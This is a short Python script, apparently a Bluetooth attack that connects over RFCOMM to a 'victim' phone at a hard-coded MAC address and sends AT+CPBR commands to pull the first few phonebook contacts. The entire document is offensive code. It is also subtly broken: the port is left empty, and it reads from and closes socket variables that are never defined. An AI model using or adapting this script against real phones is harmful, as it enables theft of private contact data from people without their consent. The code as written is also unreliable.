import bluetooth

# We will have to insert MAC address and port of victim in variables below

tgtPhone = "B0:C5:59:32:79:D2"
port = ''

phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))

for contact in range(1, 5):

    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print("[+] " + str(contact) + ": " + result)

sock.close()
